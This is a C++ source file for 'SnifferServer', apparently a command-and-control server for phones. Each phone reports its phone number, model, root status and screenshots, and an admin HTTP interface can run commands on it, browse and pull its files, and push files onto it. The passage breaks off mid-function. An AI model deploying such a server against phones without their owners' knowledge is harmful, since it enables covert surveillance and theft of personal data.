/*
 * SnifferServer.cpp
 *
 *  Created on: 2015-1-13
 *      Author: Max.Chiu
 *      Email: Kingsleyyau@gmail.com
 */

#include "SnifferServer.h"

#include "task/GetClientDirTask.h"
#include "task/SetClientCmdTask.h"
#include "task/UploadClientFileTask.h"
#include "task/DownloadClientFileTask.h"
#include "task/UpdateClientTask.h"

#include <sys/syscall.h>

/* state thread */
class StateRunnable : public KRunnable {
public:
	StateRunnable(SnifferServer *container) {
		mContainer = container;
	}
	virtual ~StateRunnable() {
		mContainer = NULL;
	}
protected:
	void onRun() {
		mContainer->StateRunnableHandle();
	}
private:
	SnifferServer *mContainer;
};

SnifferServer::SnifferServer() {
	// TODO Auto-generated constructor stub
	mpStateRunnable = new StateRunnable(this);
	mpStateThread = NULL;

	miPort = 0;
	miMaxClient = 0;
	miMaxHandleThread = 0;
	miMaxQueryPerThread = 0;
	miTimeout = 0;

	miStateTime = 0;
	miDebugMode = 0;
	miLogLevel = 0;

	mResponed = 0;
	mTotal = 0;

	mIsRunning = false;
}

SnifferServer::~SnifferServer() {
	// TODO Auto-generated destructor stub
	if( mpStateRunnable ) {
		delete mpStateRunnable;
	}
}

void SnifferServer::Run(const string& config) {
	if( config.length() > 0 ) {
		mConfigFile = config;

		// Reload config
		if( Reload() ) {
			if( miDebugMode == 1 ) {
				LogManager::LogSetFlushBuffer(0);
			} else {
				LogManager::LogSetFlushBuffer(5 * BUFFER_SIZE_1K * BUFFER_SIZE_1K);
			}

			Run();
		} else {
			printf("# Snifer Server can not load config file exit. \n");
		}

	} else {
		printf("# No config file can be use exit. \n");
	}
}

void SnifferServer::Run() {
	/* log system */
	LogManager::GetLogManager()->Start(1000, miLogLevel, mLogDir);
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::Run( "
			"miPort : %d, "
			"miMaxClient : %d, "
			"miMaxHandleThread : %d, "
			"miMaxQueryPerThread : %d, "
			"miTimeout : %d, "
			"miStateTime, %d, "
			"miLogLevel : %d, "
			"mlogDir : %s "
			")",
			miPort,
			miMaxClient,
			miMaxHandleThread,
			miMaxQueryPerThread,
			miTimeout,
			miStateTime,
			miLogLevel,
			mLogDir.c_str()
			);

	/* inside server */
	mClientTcpInsideServer.SetTcpServerObserver(this);
	mClientTcpInsideServer.SetHandleSize(1000);
	mClientTcpInsideServer.Start(1000, miPort + 1, 2);
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::Run( Inside TcpServer Init OK )");

	/* match server */
	mClientTcpServer.SetTcpServerObserver(this);
	/**
	 * 预估相应时间,内存数目*超时间隔*每秒处理的任务
	 */
	mClientTcpServer.SetHandleSize(miTimeout * miMaxQueryPerThread);
	mClientTcpServer.Start(miMaxClient, miPort, miMaxHandleThread);
	LogManager::GetLogManager()->Log(LOG_STAT, "SnifferServer::Run( TcpServer Init OK )");

	mIsRunning = true;

	mpStateThread = new KThread(mpStateRunnable);
	if( mpStateThread->start() != 0 ) {
	}

	printf("# SnifferServer start OK. \n");
	LogManager::GetLogManager()->Log(LOG_WARNING, "SnifferServer::Run( Init OK )");

	/* call server */
	while( true ) {
		/* do nothing here */
		sleep(5);
	}
}

bool SnifferServer::Reload() {
	bool bFlag = false;
	mConfigMutex.lock();
	if( mConfigFile.length() > 0 ) {
		ConfFile conf;
		conf.InitConfFile(mConfigFile.c_str(), "");
		if ( conf.LoadConfFile() ) {
			// BASE
			miPort = atoi(conf.GetPrivate("BASE", "PORT", "9876").c_str());
			miMaxClient = atoi(conf.GetPrivate("BASE", "MAXCLIENT", "100000").c_str());
			miMaxHandleThread = atoi(conf.GetPrivate("BASE", "MAXHANDLETHREAD", "2").c_str());
			miMaxQueryPerThread = atoi(conf.GetPrivate("BASE", "MAXQUERYPERCOPY", "10").c_str());
			miTimeout = atoi(conf.GetPrivate("BASE", "TIMEOUT", "10").c_str());
			miStateTime = atoi(conf.GetPrivate("BASE", "STATETIME", "30").c_str());

			// LOG
			miLogLevel = atoi(conf.GetPrivate("LOG", "LOGLEVEL", "5").c_str());
			mLogDir = conf.GetPrivate("LOG", "LOGDIR", "log");
			miDebugMode = atoi(conf.GetPrivate("LOG", "DEBUGMODE", "0").c_str());

			mClientTcpServer.SetHandleSize(miTimeout * miMaxQueryPerThread);

			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::Reload( "
					"miPort : %d, "
					"miMaxClient : %d, "
					"miMaxHandleThread : %d, "
					"miMaxQueryPerThread : %d, "
					"miTimeout : %d, "
					"miStateTime, %d, "
					"miLogLevel : %d, "
					"mlogDir : %s "
					")",
					miPort,
					miMaxClient,
					miMaxHandleThread,
					miMaxQueryPerThread,
					miTimeout,
					miStateTime,
					miLogLevel,
					mLogDir.c_str()
					);

			bFlag = true;
		}
	}
	mConfigMutex.unlock();
	return bFlag;
}

bool SnifferServer::IsRunning() {
	return mIsRunning;
}

/**
 * New request
 */
bool SnifferServer::OnAccept(TcpServer *ts, int fd, char* ip) {
	if( ts == &mClientTcpServer ) {
		Client *client = new Client();
		client->SetClientCallback(this);
		client->fd = fd;
		client->ip = ip;
		client->isOnline = true;

		mClientMap.Lock();
		mClientMap.Insert(fd, client);
		mClientMap.Unlock();

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::OnAccept( "
				"tid : %d, "
				"fd : [%d], "
				"[客户端上线] "
				")",
				(int)syscall(SYS_gettid),
				fd
				);
	} else if( ts == &mClientTcpInsideServer ) {
		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::OnAccept( "
				"tid : %d, "
				"fd : [%d], "
				"[管理者请求开始] "
				")",
				(int)syscall(SYS_gettid),
				fd
				);
	}

	return true;
}

void SnifferServer::OnDisconnect(TcpServer *ts, int fd) {
	if( ts == &mClientTcpServer ) {
		// 客户端下线
		mClientMap.Lock();
		ClientMap::iterator itr = mClientMap.Find(fd);
		Client* client = itr->second;
		if( client != NULL ) {
			// 标记下线
			client->isOnline = false;
		}
		mClientMap.Unlock();

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::OnDisconnect( "
				"tid : %d, "
				"fd : [%d], "
				"[客户端下线] "
				")",
				(int)syscall(SYS_gettid),
				fd
				);

	} else if( ts == &mClientTcpInsideServer ) {

	}

}

void SnifferServer::OnClose(TcpServer *ts, int fd) {
	if( ts == &mClientTcpServer ) {
		// 客户端下线
		mClientMap.Lock();
		ClientMap::iterator itr = mClientMap.Erase(fd);

		Client* client = itr->second;
		if( client != NULL ) {
			// 关闭会话
			CloseSessionByClient(client);
		}
		delete client;

		mClientMap.Unlock();

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::OnClose( "
				"tid : %d, "
				"fd : [%d], "
				"[客户端下线, 所有数据包处理完成] "
				")",
				(int)syscall(SYS_gettid),
				fd
				);

	} else if( ts == &mClientTcpInsideServer ) {
		// 关闭会话
		CloseSessionByRequest(fd);

		mDataHttpParserMap.Lock();
		DataHttpParserMap::iterator itr = mDataHttpParserMap.Erase(fd);
		if( itr != mDataHttpParserMap.End() ) {
			DataHttpParser* pDataHttpParser = itr->second;
			if( pDataHttpParser != NULL ) {
				delete pDataHttpParser;
			}
		}
		mDataHttpParserMap.Unlock();

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::OnClose( "
				"tid : %d, "
				"fd : [%d], "
				"[管理者请求结束] "
				")",
				(int)syscall(SYS_gettid),
				fd
				);

	}

}

void SnifferServer::OnRecvMessage(TcpServer *ts, Message *m) {
	if( &mClientTcpServer == ts ) {
		// 客户端服务请求
		HandleRecvMessage(ts, m);

		mCountMutex.lock();
		mTotal++;
		mResponed += GetTickCount() - m->starttime;
		mCountMutex.unlock();

	} else if( &mClientTcpInsideServer == ts ){
		// 管理者服务请求
		HandleInsideRecvMessage(ts, m);

	}

}

void SnifferServer::OnSendMessage(TcpServer *ts, Message *m) {
	if( ts == &mClientTcpInsideServer ) {
		mDataHttpParserMap.Lock();
		DataHttpParserMap::iterator itr = mDataHttpParserMap.Find(m->fd);
		if( itr != mDataHttpParserMap.End() ) {
			DataHttpParser* pDataHttpParser = itr->second;
			if( pDataHttpParser->IsFinishSeq(m->seq) ) {
				LogManager::GetLogManager()->Log(
						LOG_MSG,
						"SnifferServer::OnSendMessage( "
						"tid : %d, "
						"m->fd : [%d], "
						"[管理者请求回复完成], "
						"end )",
						(int)syscall(SYS_gettid),
						m->fd
						);

				ts->Disconnect(m->fd);
			}
		}
		mDataHttpParserMap.Unlock();
	}

}

void SnifferServer::OnTimeoutMessage(TcpServer *ts, Message *m) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::OnTimeoutMessage( "
			"tid : %d, "
			"m->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			m->fd
			);

	HandleTimeoutMessage(ts, m);

}

void SnifferServer::StateRunnableHandle() {
	unsigned int iCount = 0;
	unsigned int iStateTime = miStateTime;

	unsigned int iTotal = 0;
	double iSecondTotal = 0;
	double iResponed = 0;

	while( IsRunning() ) {
		if ( iCount < iStateTime ) {
			iCount++;

		} else {
			iCount = 0;

			iCount = 0;
			iSecondTotal = 0;
			iResponed = 0;

			mCountMutex.lock();
			iTotal = mTotal;

			if( iStateTime != 0 ) {
				iSecondTotal = 1.0 * iTotal / iStateTime;
			}
			if( iTotal != 0 ) {
				iResponed = 1.0 * mResponed / iTotal;
			}

			mTotal = 0;
			mResponed = 0;
			mCountMutex.unlock();

			LogManager::GetLogManager()->Log(
					LOG_WARNING,
					"SnifferServer::StateRunnable( "
					"tid : %d, "
					"过去%u秒共收到%u个请求, "
					"平均收到%.1lf个/秒, "
					"平均响应时间%.1lf毫秒/个"
					")",
					(int)syscall(SYS_gettid),
					iStateTime,
					iTotal,
					iSecondTotal,
					iResponed
					);

			iStateTime = miStateTime;

		}
		sleep(1);
	}
}

bool SnifferServer::SendRequestMsg2Client(
		const int& request,
		Client* client,
		ITask* task
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::SendRequestMsg2Client( "
			"tid : %d, "
			"request : [%d], "
			"client->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			request,
			client->fd
			);

	bool bFlag = false;

	if( !client->isOnline ) {
		return bFlag;
	}

	Message* sm = mClientTcpServer.GetIdleMessageList()->PopFront();
	if( sm != NULL ) {
		mClient2RequestMap.Lock();
		Session* session = NULL;
		Request2ClientMap::iterator itr = mRequest2ClientMap.Find(request);
		if( itr != mRequest2ClientMap.End() ) {
			session = itr->second;
		} else {
			session = new Session(request, client);
			mRequest2ClientMap.Insert(request, session);
			mClient2RequestMap.Insert(client->fd, session);

			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::SendRequestMsg2Client( "
					"tid : %d, "
					"request : [%d], "
					"client->fd : [%d], "
					"session : %p, "
					"[开始新会话] "
					")",
					(int)syscall(SYS_gettid),
					request,
					client->fd,
					session
					);
		}

		int seq = client->AddSeq();
		session->InsertRequestTask(seq, task);

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::SendRequestMsg2Client( "
				"tid : %d, "
				"request : [%d], "
				"client->fd : [%d], "
				"session : %p, "
				"seq : %d, "
				"task : %p, "
				"[插入任务到会话] "
				")",
				(int)syscall(SYS_gettid),
				request,
				client->fd,
				session,
				seq,
				task
				);

		SCMD* scmd = (SCMD*)sm->buffer;
		task->GetSendCmd(scmd, seq);

		sm->fd = client->fd;
		sm->len = sizeof(SCMDH) + scmd->header.len;

		mClientTcpServer.SendMessageByQueue(sm);

		bFlag = true;

		mClient2RequestMap.Unlock();
	}

	return bFlag;
}

bool SnifferServer::ReturnClientMsg2Request(
		Client* client,
		SCMD* scmd
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::ReturnClientMsg2Request( "
			"tid : %d, "
			"client->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			client->fd
			);

	bool bFlag = false;

	mClient2RequestMap.Lock();
	Client2RequestMap::iterator itr = mClient2RequestMap.Find(client->fd);
	if( itr != mClient2RequestMap.End() ) {
		// 客户端在会话中
		Session* session = itr->second;
		if( session != NULL ) {
			int seq = scmd->header.seq;
			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::ReturnClientMsg2Request( "
					"tid : %d, "
					"client->fd : [%d], "
					"session : %p, "
					"seq : %d, "
					"[客户端在会话中] "
					")",
					(int)syscall(SYS_gettid),
					client->fd,
					session,
					seq
					);

			ITask* task = session->EraseRequestTask(seq);
			if( task != NULL ) {
				// 会话中存在对应的命令号
				LogManager::GetLogManager()->Log(
						LOG_MSG,
						"SnifferServer::ReturnClientMsg2Request( "
						"tid : %d, "
						"client->fd : [%d], "
						"task : %p, "
						"[会话中存在对应的命令号] "
						")",
						(int)syscall(SYS_gettid),
						client->fd,
						task
						);

				Message* sm = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
				if( sm != NULL ) {
					char buffer[MAX_BUFFER_LEN] = {'\0'};
					int len;
					task->GetReturnData(scmd, buffer, len);

					snprintf(
							sm->buffer,
							MAX_BUFFER_LEN - 1,
							"HTTP/1.1 200 OK\r\nContext-Length:%d\r\n\r\n%s",
							len,
							buffer
							);

					sm->fd = session->request;
					sm->len = strlen(sm->buffer);

					mClientTcpInsideServer.SendMessageByQueue(sm);
					mDataHttpParserMap.Lock();
					DataHttpParserMap::iterator itr = mDataHttpParserMap.Find(sm->fd);
					if( itr != mDataHttpParserMap.End() ) {
						DataHttpParser* pDataHttpParser = itr->second;
						pDataHttpParser->SetSendMaxSeq(sm->seq);
					}
					mDataHttpParserMap.Unlock();

					bFlag = true;
				}

				delete task;
				task = NULL;

			} else {
				LogManager::GetLogManager()->Log(
						LOG_MSG,
						"SnifferServer::ReturnClientMsg2Request( "
						"tid : %d, "
						"client->fd : [%d], "
						"[会话中不存在对应命令号] "
						")",
						(int)syscall(SYS_gettid),
						client->fd
						);
			}

			mRequest2ClientMap.Erase(session->request);

			delete session;
			session = NULL;

		} else {
			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::ReturnClientMsg2Request( "
					"tid : %d, "
					"client->fd : [%d], "
					"[客户端不在会话中] "
					")",
					(int)syscall(SYS_gettid),
					client->fd
					);
		}

		mClient2RequestMap.Erase(itr->first);
	}
	mClient2RequestMap.Unlock();

	return bFlag;
}

bool SnifferServer::CloseSessionByRequest(
		const int& request
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::CloseSessionByRequest( "
			"tid : %d, "
			"request : [%d] "
			")",
			(int)syscall(SYS_gettid),
			request
			);

	bool bFlag = false;

	mClient2RequestMap.Lock();
	Request2ClientMap::iterator itr = mRequest2ClientMap.Erase(request);
	if( itr != mRequest2ClientMap.End() ) {
		Session* session = itr->second;
		if( session != NULL ) {
			mClient2RequestMap.Erase(session->client->fd);
			delete session;
		}

		bFlag = true;
	}
	mClient2RequestMap.Unlock();

	return bFlag;
}

/**
 * 内部服务器关闭会话
 */
bool SnifferServer::CloseSessionByClient(Client* client) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::CloseSessionByClient( "
			"tid : %d, "
			"client->fd : [%d] "
			")",
			(int)syscall(SYS_gettid),
			client->fd
			);
	bool bFlag = false;

	mClient2RequestMap.Lock();
	Client2RequestMap::iterator itr = mClient2RequestMap.Erase(client->fd);
	if( itr != mClient2RequestMap.End() ) {
		Session* session = itr->second;
		if( session != NULL ) {
			// 返回错误
			Message* sm = mClientTcpInsideServer.GetIdleMessageList()->PopFront();
			if( sm != NULL ) {
				Json::Value root;
				Json::FastWriter writer;
				string param;

				root[COMMON_RET] = 0;
				param = writer.write(root);

				snprintf(
						sm->buffer,
						MAX_BUFFER_LEN - 1,
						"HTTP/1.1 200 OK\r\nContext-Length:%d\r\n\r\n%s",
						(int)param.length(),
						param.c_str()
						);

				sm->fd = session->request;
				sm->len = strlen(sm->buffer);

				mClientTcpInsideServer.SendMessageByQueue(sm);

				bFlag = true;
			}

			mRequest2ClientMap.Erase(session->request);

			delete session;
		}

		bFlag = true;
	}
	mClient2RequestMap.Unlock();

	return bFlag;
}

int SnifferServer::HandleRecvMessage(TcpServer *ts, Message *m) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::HandleRecvMessage( "
			"tid : %d, "
			"m->fd: [%d] "
			")",
			(int)syscall(SYS_gettid),
			m->fd
			);

	int ret = 0;

	if( m->buffer != NULL ) {
		Client *client = NULL;

		/**
		 * 因为还有数据包处理队列中, tcpserver不会回调OnClose, 所以不怕client被释放
		 * 放开锁就可以使多个client并发解数据包, 单个client解包只能同步解包, 在client内部加锁
		 */
		mClientMap.Lock();
		ClientMap::iterator itr = mClientMap.Find(m->fd);
		if( itr != mClientMap.End() ) {
			client = itr->second;
			mClientMap.Unlock();
		} else {
			mClientMap.Unlock();
		}

		ret = client->ParseData(m);
		if( ret == -1 ) {
			mClientTcpServer.Disconnect(client->fd);
		}
//		mClientMap.Unlock();
	}

	return ret;
}

void SnifferServer::OnParseCmd(Client* client, SCMD* scmd) {
	bool bFlag = false;

	if( client != NULL && scmd != NULL ) {
		if( scmd->header.bNew ) {
			// 客户端发起命令
			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::OnParseCmd( "
					"tid : %d, "
					"client->fd: [%d], "
					"[客户端发起命令] "
					")",
					(int)syscall(SYS_gettid),
					client->fd
					);

		    Json::Reader reader;
		    Json::Value rootRecv;

			switch (scmd->header.scmdt) {
			case SnifferTypeClientInfo: {
				// 获取手机号和手机型号返回
		        reader.parse(scmd->param, rootRecv);

		        client->deviceId = rootRecv[DEVICE_ID].asString();
		        client->version = rootRecv[VERSION].asString();
		        client->cwd = rootRecv[CWD].asString();

		        client->brand = rootRecv[PHONE_INFO_BRAND].asString();
		        client->model = rootRecv[PHONE_INFO_MODEL].asString();
		        client->phoneNumber = rootRecv[PHONE_INFO_NUMBER].asString();
		        client->abi = rootRecv[PHONE_INFO_ABI].asString();
		        client->isRoot = rootRecv[IS_ROOT].asBool();

				LogManager::GetLogManager()->Log(
						LOG_MSG,
						"SnifferServer::OnParseCmd( "
						"tid : %d, "
						"fd : [%d], "
						"[获取手机号和手机型号返回] "
						")",
						(int)syscall(SYS_gettid),
						client->fd
						);

			}break;
			case SnifferScreenCapUpdate:{
				// 更新客户端截屏
		        reader.parse(scmd->param, rootRecv);

		        client->screencap = rootRecv[CLIENT_SCREENCAP_URL].asString();

				LogManager::GetLogManager()->Log(
						LOG_MSG,
						"SnifferServer::OnParseCmd( "
						"tid : %d, "
						"fd : [%d], "
						"[更新客户端截屏] "
						")",
						(int)syscall(SYS_gettid),
						client->fd
						);
			}break;
			default:break;
			}

			bFlag = true;
		} else {
			// 客户端返回命令
			LogManager::GetLogManager()->Log(
					LOG_MSG,
					"SnifferServer::OnParseCmd( "
					"tid : %d, "
					"client->fd: [%d], "
					"[客户端返回命令] "
					")",
					(int)syscall(SYS_gettid),
					client->fd
					);

			bFlag = ReturnClientMsg2Request(client, scmd);
		}

	}

	LogManager::GetLogManager()->Log(
			LOG_STAT,
			"SnifferServer::OnParseCmd( "
			"tid : %d, "
			"bFlag : %s "
			")",
			(int)syscall(SYS_gettid),
			bFlag?"true":"false"
			);
}

int SnifferServer::HandleTimeoutMessage(TcpServer *ts, Message *m) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::HandleTimeoutMessage( "
			"tid : %d, "
			"m->fd: [%d], "
			")",
			(int)syscall(SYS_gettid),
			m->fd
			);

	int ret = -1;

	Message *sm = ts->GetIdleMessageList()->PopFront();
	if( sm != NULL ) {
		sm->fd = m->fd;
		sm->wr = m->wr;

		Json::FastWriter writer;
		Json::Value rootSend, womanListNode, womanNode;

		sm->totaltime = GetTickCount() - m->starttime;

		string param = writer.write(rootSend);

		snprintf(sm->buffer, MAX_BUFFER_LEN - 1, "HTTP/1.1 200 ok\r\nContext-Length:%d\r\n\r\n%s",
				(int)param.length(), param.c_str());
		sm->len = strlen(sm->buffer);

		ts->SendMessageByQueue(sm);

	} else {
		LogManager::GetLogManager()->Log(
				LOG_WARNING,
				"SnifferServer::HandleTimeoutMessage( "
				"tid : %d, "
				"m->fd : [%d], "
				"No idle message can be use "
				")",
				(int)syscall(SYS_gettid),
				m->fd
				);

		// 断开连接
		ts->Disconnect(m->fd);
	}

	return ret;
}

int SnifferServer::HandleInsideRecvMessage(TcpServer *ts, Message *m) {
	int ret = -1;

	int code = 200;
	char reason[16] = {"OK"};
	string result = "";

	DataHttpParser* pDataHttpParser;

	mDataHttpParserMap.Lock();
	DataHttpParserMap::iterator itr = mDataHttpParserMap.Find(m->fd);
	if( itr == mDataHttpParserMap.End() ) {
		pDataHttpParser = new DataHttpParser();
		mDataHttpParserMap.Insert(m->fd, pDataHttpParser);
	} else {
		pDataHttpParser = itr->second;
	}
	mDataHttpParserMap.Unlock();

	pDataHttpParser->Reset();
	if ( DiffGetTickCount(m->starttime, GetTickCount()) < miTimeout * 1000 ) {
		if( m->buffer != NULL ) {
			ret = pDataHttpParser->ParseData(m->buffer, m->len);
		}
	}

	if( ret == 1 ) {
		ret = -1;
		const string pPath = pDataHttpParser->GetPath();
		HttpType type = pDataHttpParser->GetType();

		PROTOCOLTYPE ptType = HTML;
		const string pCommonType = pDataHttpParser->GetParam(COMMON_PROTOCOL_TYPE);
		if( pCommonType.length() > 0 ) {
			if( strcasecmp(pCommonType.c_str(), COMMON_PROTOCOL_TYPE_JSON) == 0 ) {
				ptType = JSON;
			}
		}

		LogManager::GetLogManager()->Log(
				LOG_MSG,
				"SnifferServer::HandleInsideRecvMessage( "
				"tid : %d, "
				"m->fd: [%d], "
				"type : %d, "
				"pPath : %s, "
				"pCommonType : %s "
				")",
				(int)syscall(SYS_gettid),
				m->fd,
				type,
				pPath.c_str(),
				pCommonType.c_str()
				);

		if( type == GET ) {
			if( strcasecmp(pPath.c_str(), GET_CLIENT_LIST) == 0 ) {
				// 获取在线客户端列表
				ret = GetClientList(result, m, ptType);

			} else if( strcasecmp(pPath.c_str(), GET_CLIENT_INFO) == 0 ) {
				// 获取在线客户端详细信息
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);
				ret = GetClientInfo(result, pClientId, m, ptType);

			} else if( strcasecmp(pPath.c_str(), SET_CLIENT_CMD) == 0 ) {
				// 执行客户端命令
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);
				const string pCommand = pDataHttpParser->GetParam(COMMAND);
				ret = SetClientCmd(pClientId, pCommand, m, ptType);

			} else if( strcasecmp(pPath.c_str(), GET_CLIENT_DIR) == 0 ) {
				// 获取客户端目录
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);
				const string pDirecory = pDataHttpParser->GetParam(DIRECTORY);
				const string pPageIndex = pDataHttpParser->GetParam(COMMON_PAGE_INDEX);
				const string pPageSize = pDataHttpParser->GetParam(COMMON_PAGE_SIZE);
				ret = GetClientDir(pClientId, pDirecory, pPageIndex, pPageSize, m, ptType);

			} else if( strcasecmp(pPath.c_str(), UPLOAD_CLIENT_FILE) == 0 ) {
				// 上传客户端文件
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);
				const string pFilePath = pDataHttpParser->GetParam(FILEPATH);

				ret = UploadClientFile(pClientId, pFilePath, m, ptType);

			} else if( strcasecmp(pPath.c_str(), DOWNLOAD_CLIENT_FILE) == 0 ) {
				// 下载文件到客户端
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);
				const string pUrl = pDataHttpParser->GetParam(URL);
				const string pFilePath = pDataHttpParser->GetParam(FILEPATH);
				const string pFileName = pDataHttpParser->GetParam(FILENAME);

				ret = DownloadClientFile(pClientId, pUrl, pFilePath, pFileName, m, ptType);

			} else if( strcasecmp(pPath.c_str(), KICK_CLIENT) == 0 ) {
				// 踢掉客户端
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);

				ret = KickClient(result, pClientId, m, ptType);

			} else if( strcasecmp(pPath.c_str(), UPDATE_CLIENT) == 0 ) {
				// 更新客户端
				const string pClientId = pDataHttpParser->GetParam(CLIENT_ID);

				ret = UpdateClient(result, pClientId, m, ptType);

			} else if( strcasecmp(pPath.c_str(), RELOAD) == 0 ) {
				// 重新加载配置
				Json::FastWriter writer;
				Json::Value rootSend;

				if( Reload()) {
					rootSend[COMMON_RET] = 1;
				}

				result = writer.write(rootSend);
				ret = 1;

			} else {
				// 不匹配的接口
				code = 404;
				sprintf(reason, "Not Found");
				result = "404 Not Found";
			}
		} else {
			code = 404;
			sprintf(reason, "Not Found");
			result = "404 Not Found";
		}

	}

	if( ret != 0 ) {
		// Process finish, send respond
		// send http header
		Message *sm = ts->GetIdleMessageList()->PopFront();
		if( sm != NULL ) {
			sm->fd = m->fd;
			sm->wr = m->wr;

			snprintf(sm->buffer, MAX_BUFFER_LEN - 1, "HTTP/1.1 %d %s\r\nContext-Length:%d\r\n\r\n",
					code,
					reason,
					(int)result.length()
					);
			sm->len = strlen(sm->buffer);

			ts->SendMessageByQueue(sm);
			pDataHttpParser->SetSendMaxSeq(sm->seq);

		} else {
			LogManager::GetLogManager()->Log(
					LOG_WARNING,
					"SnifferServer::HandleInsideRecvMessage( "
					"tid : %d, "
					"m->fd : [%d], "
					"Send header, no idle message can be use "
					")",
					(int)syscall(SYS_gettid),
					m->fd
					);

			// 断开连接
			ts->Disconnect(m->fd);

			return -1;
		}

		// send http body
		int iSendBodyLen = 0;
		while( iSendBodyLen < (int)result.length() ) {
			Message *sm = ts->GetIdleMessageList()->PopFront();
			if( sm != NULL ) {
				sm->fd = m->fd;
				sm->wr = m->wr;

				snprintf(sm->buffer, MAX_BUFFER_LEN - 1, "%s", result.c_str() + iSendBodyLen);
				sm->len = strlen(sm->buffer);

				iSendBodyLen += sm->len;

				ts->SendMessageByQueue(sm);
				pDataHttpParser->SetSendMaxSeq(sm->seq);

			} else {
				LogManager::GetLogManager()->Log(
						LOG_WARNING,
						"SnifferServer::HandleInsideRecvMessage( "
						"tid : %d, "
						"m->fd : [%d], "
						"Send http body, no idle message can be use "
						")",
						(int)syscall(SYS_gettid),
						m->fd
						);

				// 断开连接
				ts->Disconnect(m->fd);

				return -1;
			}
		}

	} else {
		// receive continue
	}

	return ret;
}

/**
 * 获取在线客户端
 */
int SnifferServer::GetClientList(
		string& result,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::GetClientList( "
			"tid : %d, "
			"m->fd: [%d], "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			ptType
			);

	Client *client = NULL;

	mClientMap.Lock();
	switch( ptType ) {
	case HTML:{
		char count[16];
		sprintf(count, "%d", mClientMap.Size());

		result = "<html><head><title>客户端管理页面</title><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
		result += "<pre>";
		result += "<b>在线客户端列表 : ";
		result += count;
		result += " 个</b>\n";

		char line[1024];
		snprintf(
				line, sizeof(line) - 1,
				"[%8s]"
				"[%32s]"
				"[%15s]"
				"[%8s]\n",
				"ClientId",
				"DeviceId",
				"IP",
				"VERSION"
				);
		result += line;
		for( ClientMap::iterator itr = mClientMap.Begin(); itr != mClientMap.End(); itr++ ) {
			client = (Client*)itr->second;
			char clientId[16];
			sprintf(clientId, "%d", client->fd);

			snprintf(
					line, sizeof(line) - 1,
					"[%8s]"
					"[%32s]"
					"[%15s]"
					"[%8s] ",
					clientId,
					client->deviceId.c_str(),
					client->ip.c_str(),
					client->version.c_str()
					);
			result += line;

			result += "<a href=\"";
			result += GET_CLIENT_INFO;
			result += "?";
			result += CLIENT_ID;
			result += "=";
			result += clientId;
			result += "\">";
			result += "[查看]";
			result += "</a> ";

			result += "<a href=\"";
			result += KICK_CLIENT;
			result += "?";
			result += CLIENT_ID;
			result += "=";
			result += clientId;
			result += "\">";
			result += "[踢掉]";
			result += "</a> ";

			result += "<a href=\"";
			result += UPDATE_CLIENT;
			result += "?";
			result += CLIENT_ID;
			result += "=";
			result += clientId;
			result += "\">";
			result += "[更新]";
			result += "</a>\n";
		}

		result += "</pre>";
		result += "</body></html>";

	}break;
	case JSON:{
		Json::FastWriter writer;
		Json::Value rootSend;
		Json::Value clientListNode;

		for( ClientMap::iterator itr = mClientMap.Begin(); itr != mClientMap.End(); itr++ ) {
			client = (Client*)itr->second;

			Json::Value clientNode;
			clientNode[CLIENT_ID] = client->fd;
			clientNode[DEVICE_ID] = client->deviceId;
			clientListNode.append(clientNode);
		}

		rootSend[COMMON_RET] = 1;
		rootSend[CLIENT_LIST] = clientListNode;

		result = writer.write(rootSend);

	}break;
	}
	mClientMap.Unlock();

	return 1;
}

/**
 * 获取在线客户端详细信息
 */
int SnifferServer::GetClientInfo(
		string& result,
		const string& clientId,
		Message *m,
		PROTOCOLTYPE ptType
		) {
	int ret = -1;
	LogManager::GetLogManager()->Log(
			LOG_MSG,
			"SnifferServer::GetClientInfo( "
			"tid : %d, "
			"m->fd: [%d], "
			"clientId : %s, "
			"ptType : %d "
			")",
			(int)syscall(SYS_gettid),
			m->fd,
			clientId.c_str(),
			ptType
			);

	string deviceId = "";
	string ip = "";
	string version = "";

	bool isRoot = false;
	string brand = "";
	string model = "";
	string phoneNumber = "";
	string abi = "";
	string screencap = "";

	Client *client = NULL;
	mClientMap.Lock();
	ClientMap::iterator itr = mClientMap.Find(atoi(clientId.c_str()));
	if( itr != mClientMap.End() ) {
		client = (Client*)itr->second;

		deviceId = client->deviceId;
		ip = client->ip;
		version = client->version;

		isRoot = client->isRoot;
		brand = client->brand;
		model = client->model;
		phoneNumber = client->phoneNumber;
		abi = client->abi;
